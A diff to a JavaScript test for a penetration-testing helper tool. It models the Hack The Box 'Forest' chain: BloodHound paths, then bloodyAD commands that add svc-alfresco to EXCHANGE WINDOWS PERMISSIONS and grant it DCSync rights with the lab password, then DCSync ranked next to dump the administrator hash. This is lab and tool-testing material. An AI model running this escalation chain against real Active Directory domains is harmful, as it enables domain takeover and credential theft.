@@ -68,8 +68,11 @@ const bhSummary = {
 };
 const bhPaths = [
   [
-    { from: 'svc-alfresco@htb.local', edge: 'MemberOf', to: 'Exchange Windows Permissions@htb.local' },
-    { from: 'Exchange Windows Permissions@htb.local', edge: 'WriteDacl', to: 'HTB.LOCAL' }
+    { from: 'SVC-ALFRESCO@HTB.LOCAL', edge: 'MemberOf', to: 'SERVICE ACCOUNTS@HTB.LOCAL', to_kind: 'Group' },
+    { from: 'SERVICE ACCOUNTS@HTB.LOCAL', edge: 'MemberOf', to: 'PRIVILEGED IT ACCOUNTS@HTB.LOCAL', to_kind: 'Group' },
+    { from: 'PRIVILEGED IT ACCOUNTS@HTB.LOCAL', edge: 'MemberOf', to: 'ACCOUNT OPERATORS@HTB.LOCAL', to_kind: 'Group' },
+    { from: 'ACCOUNT OPERATORS@HTB.LOCAL', edge: 'GenericAll', to: 'EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL', to_kind: 'Group' },
+    { from: 'EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL', edge: 'WriteDacl', to: 'HTB.LOCAL', to_kind: 'Domain' }
   ]
 ];
 
@@ -77,35 +80,76 @@ const bhFacts = bh.toFacts(bhSummary, bhPaths, 'domain:' + domain);
 console.log('BloodHound generated facts for Forest:', bhFacts.map(f => f.kind));
 bhFacts.forEach(f => store.add(f));
 
-// Check that ad.control_paths and ad.acl_lead are present
-if (!store.has('ad.control_paths')) {
-  console.error('FAIL: ad.control_paths missing from BloodHound ingest!');
+// Check that ad.attack_paths and ad.acl_lead are present, and ad.control_paths is NOT prematurely minted
+if (!store.has('ad.attack_paths') || !store.has('ad.acl_lead')) {
+  console.error('FAIL: ad.attack_paths or ad.acl_lead missing from BloodHound ingest!');
   process.exit(1);
 }
-console.log('PASS: BloodHound minted ad.control_paths and ad.acl_lead');
+if (store.has('ad.control_paths')) {
+  console.error('FAIL: ad.control_paths must NOT be minted before walking the ACL path!');
+  process.exit(1);
+}
+console.log('PASS: BloodHound minted ad.attack_paths + ad.acl_lead without premature ad.control_paths');
 
-// 5. Verify ACL abuse / bloodyAD action un-gated
+// 5. Verify bloodyad-acl is #1 on Next Steps, un-settled, and fills group without @HTB.LOCAL
 const bloodyAction = OBOL.packs.actions().find(a => a.id === 'bloodyad-acl');
-const isBloodyEligible = bloodyAction.eligible(store);
-console.log('Is bloodyad-acl eligible?:', isBloodyEligible);
-if (!isBloodyEligible) {
-  console.error('FAIL: bloodyad-acl should be eligible with ad.control_paths / ad.acl_lead!');
-  process.exit(1);
-}
-console.log('PASS: bloodyad-acl is eligible!');
-
-// 6. Simulate adding DCSync rights to svc-alfresco
-addFact('ad.control_paths', { tool: 'bloodyad', action: 'add dcsync', principal: 'svc-alfresco' });
-
-// 7. Verify DCSync action un-gated
 const dcsyncAction = OBOL.packs.actions().find(a => a.id === 'dcsync');
-const isDcsyncEligible = dcsyncAction.eligible(store);
-console.log('Is dcsync eligible?:', isDcsyncEligible);
-if (!isDcsyncEligible) {
-  console.error('FAIL: dcsync should be eligible!');
+if (!bloodyAction.eligible(store) || bloodyAction.settled(store)) {
+  console.error('FAIL: bloodyad-acl should be eligible and NOT settled after BloodHound upload!');
   process.exit(1);
 }
-console.log('PASS: dcsync is eligible!');
+if (dcsyncAction.eligible(store)) {
+  console.error('FAIL: dcsync must NOT be eligible before granting replication rights!');
+  process.exit(1);
+}
+const rankedAfterBh = OBOL.pack.rankActions(store, OBOL.packs.actions(), {});
+console.log('Top 3 moves after BloodHound:', rankedAfterBh.slice(0, 3).map(a => a.id));
+if (!rankedAfterBh[0] || rankedAfterBh[0].id !== 'bloodyad-acl') {
+  console.error('FAIL: bloodyad-acl should be Rank #1 after BloodHound upload, got:', rankedAfterBh[0] && rankedAfterBh[0].id);
+  process.exit(1);
+}
+const filledStep1 = OBOL.command.fillAll(bloodyAction, store, { params: { target, domain, user: 'svc-alfresco', password: 's3rvice' } });
+if (!filledStep1[1].filled.includes('"EXCHANGE WINDOWS PERMISSIONS"') || filledStep1[1].filled.includes('@HTB.LOCAL')) {
+  console.error('FAIL: bloodyad-acl Command 1 did not fill clean group name:', filledStep1[1].filled);
+  process.exit(1);
+}
+console.log('PASS: bloodyad-acl is Rank #1 and fills:', filledStep1[1].filled);
+
+// 6. Simulate Hop 1: adding svc-alfresco to EXCHANGE WINDOWS PERMISSIONS
+const parseGroupAdd = OBOL.parsers.parseActionOutput({
+  actionId: 'bloodyad-acl',
+  command: 'bloodyAD --host "10.10.10.161" -d "htb.local" -u "svc-alfresco" -p \'s3rvice\' add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco',
+  stdout: '[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS\n',
+  scope: 'host:' + target,
+  domain: domain
+});
+parseGroupAdd.facts.forEach(f => store.add(f));
+if (!OBOL.pack.commandSettled(bloodyAction.commands[1], store) || OBOL.pack.commandSettled(bloodyAction.commands[3], store)) {
+  console.error('FAIL: After Hop 1, add groupMember should be settled and add dcsync should be active!');
+  process.exit(1);
+}
+console.log('PASS: Hop 1 (add groupMember) settled; Hop 2 (add dcsync) is now the active command!');
+
+// 7. Simulate Hop 2: granting DCSync rights to svc-alfresco
+const parseDcsyncGrant = OBOL.parsers.parseActionOutput({
+  actionId: 'bloodyad-acl',
+  command: 'bloodyAD --host "10.10.10.161" -d "htb.local" -u "svc-alfresco" -p \'s3rvice\' add dcsync svc-alfresco',
+  stdout: '[+] svc-alfresco is now able to dcsync\n',
+  scope: 'host:' + target,
+  domain: domain
+});
+parseDcsyncGrant.facts.forEach(f => store.add(f));
+if (!bloodyAction.settled(store) || !dcsyncAction.eligible(store)) {
+  console.error('FAIL: After Hop 2 (add dcsync), bloodyad-acl should settle and dcsync should unlock!');
+  process.exit(1);
+}
+const rankedAfterGrant = OBOL.pack.rankActions(store, OBOL.packs.actions(), {});
+console.log('Top 3 moves after DCSync grant:', rankedAfterGrant.slice(0, 3).map(a => a.id));
+if (!rankedAfterGrant[0] || rankedAfterGrant[0].id !== 'dcsync') {
+  console.error('FAIL: dcsync should be Rank #1 after granting DCSync rights, got:', rankedAfterGrant[0] && rankedAfterGrant[0].id);
+  process.exit(1);
+}
+console.log('PASS: dcsync is now Rank #1!');
 
 // 8. DCSync output parsed -> mints administrator hash & credential.admin
 const secretsdumpOutput = `
